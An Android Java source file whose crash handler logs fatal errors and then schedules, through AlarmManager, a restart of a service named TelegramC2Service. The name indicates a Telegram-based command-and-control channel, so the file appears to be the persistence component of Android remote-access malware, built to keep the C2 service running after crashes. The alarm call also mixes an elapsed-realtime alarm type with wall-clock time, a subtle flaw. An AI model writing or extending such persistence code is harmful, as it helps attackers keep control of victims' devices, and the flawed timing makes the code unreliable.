package com.chimera;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;

public class CrashHandler implements Thread.UncaughtExceptionHandler {
    private Context context;
    private Thread.UncaughtExceptionHandler defaultHandler;

    public CrashHandler(Context ctx) {
        this.context = ctx.getApplicationContext();
        this.defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        try {
            // First, log the fatal crash
            ErrorLogger.logError(context, "CrashHandler (FATAL)", throwable);

            // Now, schedule the service to restart
            scheduleRestart();

        } catch (Exception e) {
            // Failsafe if logging or scheduling fails
        } finally {
            // Important: Call the default handler to allow the app to close properly
            if (defaultHandler != null) {
                defaultHandler.uncaughtException(thread, throwable);
            }
            System.exit(2); // Ensure the process terminates
        }
    }

    private void scheduleRestart() {
        try {
            Intent intent = new Intent(context, TelegramC2Service.class);
            PendingIntent pendingIntent = PendingIntent.getService(
                    context,
                    999, // A unique request code
                    intent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
            );

            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            // Restart the service 1 second after the crash
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent);

        } catch (Exception e) {
            ErrorLogger.logError(context, "CrashHandler_ScheduleRestart", e);
        }
    }
}